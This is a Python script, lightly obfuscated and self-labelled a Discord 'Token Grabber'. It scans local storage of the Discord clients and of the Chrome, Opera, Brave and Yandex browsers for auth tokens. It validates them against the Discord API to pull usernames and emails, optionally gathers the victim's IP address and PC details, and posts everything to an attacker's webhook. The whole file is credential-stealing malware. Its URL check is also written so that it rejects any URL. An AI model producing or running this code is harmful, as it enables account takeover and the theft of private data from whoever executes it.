F = False
Y='WEBHOOK HERE'
R=F
S=F
T=F
l='content'
k='discriminator'
j='windows_ver'
i='pc_name'
h='user'
g='@everyone\n'
f=None
e='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
b='application/json'
a='User-Agent'
Z='Content-Type'
d=str
X=len
P=print
O='username'
N=''
C=Exception
import os as B,re,json as I,random as Q,platform as A
D=Y
try:import requests as E
except C:P('some libraries could not be found');raise
if not A.system()=='Windows':raise OSError
def J(path):
	A=path;A+='\\Local Storage\\leveldb';D=[]
	for C in B.listdir(A):
		if not C.endswith('.log')and not C.endswith('.ldb'):continue
		for E in [B.strip()for B in open(f"{A}\\{C}").readlines()if B.strip()]:
			for F in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}','mfa\\.[\\w-]{84}'):
				for G in re.findall(F,E):D.append(G)
	return D
def G(token):return I.loads(E.get('https://discord.com/api/v9/users/@me',headers={'Authorization':token,Z:b,a:e}).text)
def U():A='https://api.ipify.org/';B=E.get(A);return B.text
def V():D=' ';C=dict(user=B.getlogin(),pc_name=A.uname().node,windows_ver='Windows '+A.release()+D+A.win32_edition()+D+A.version());return C
def c(user_data):
	D='None';C='premium_type';B=user_data
	try:
		if B[C]==0:A=D
		elif B[C]==1:A='Nitro Classic ($5)'
		elif B['premium']==2:A='Nitro ($10)'
	except KeyError:A=D
	return A
if D==Y:P('Please add a webhook URL');raise C
if not D.startswith('http://')or not D.startswith('https://'):P('WEBHOOK_URL is not a url');raise C
K=B.getenv('LOCALAPPDATA')
H=B.getenv('APPDATA')
L={'Discord':H+'\\Discord','Discord Canary':H+'\\discordcanary','Discord PTB':H+'\\discordptb','Google Chrome':K+'\\Google\\Chrome\\User Data\\Default','Opera':H+'\\Opera Software\\Opera Stable','Brave':K+'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':K+'\\Yandex\\YandexBrowser\\User Data\\Default'}
W={Z:b,a:e}
M=f
F=f
if R:M=U()
if S:F=V()
def m():
	A=g if T else N;A+='**IP**\n``'+M+'``\n'if M else N;A+='**PC_INFO**\n'+f"Username: ``{F[h]}``\nPC NAME: ``{F[i]}``\nWindows Version: ``{F[j]}``"if F else N
	for (Q,K) in L.items():
		if not B.path.exists(K):continue
		A+=f"\n**{Q}**\n```\n";P=J(K)
		if X(P)>0:
			for H in P:
				try:A+=f"{G(H)[O]}#{G(H)[k]}\n";A+=f"{H}\n\n"
				except C:pass
		else:A+='No tokens found.\n'
		A+='```'
	R=I.dumps({O:'Token Grabber by Mega145',l:A})
	try:E.post(D,data=R.encode(),headers=W)
	except C:pass
def n():
	u='value';t='fields';s='color';r='description';q='title';b='name';F=[]
	if S:H=V();K=Q.randint(0,16777215);M={q:'PC_INFO',r:f"``{H[j]}``",s:K,t:[{b:'**PC_IDENTITY**',u:f"Username: ``{H[h]}``\nPC NAME: ``{H[i]}``"}]};F.append(M)
	for (e,Y) in L.items():
		if not B.path.exists(Y):continue
		Z=J(Y)
		if X(Z)>0:
			for a in Z:
				try:A=G(a)
				except C:continue
				try:K=Q.randint(0,16777215);f=c(A);P=f"{A[O]}#{A[k]}";M={q:P,r:f"Token:\n```{a}```",s:K,t:[{b:f"**Discord Account Info from {e}**",u:f"NAME: ``{P}``\nEMAIL: ``{A['email']}``\nNitro: ``{f}``\n"}],'author':{b:P,'icon_url':'https://cdn.discordapp.com/avatars/'+d(A['id'])+'/'+d(A['avatar'])}};F.append(M)
				except C:pass
	m=g if T else'\n';n=U()if R else N;o={O:'Token Grabber by MegaDev',l:'You got a hit. '+m+'IP: ``'+n+'``','embeds':F};p=I.dumps(o);E.post(D,headers=W,data=p.encode())
def o():
	for (I,A) in L.items():
		if not B.path.exists(A):continue
		F=J(A)
		if X(F)>0:
			for H in F:
				try:G(H);E.post(D,data=H.encode())
				except C:continue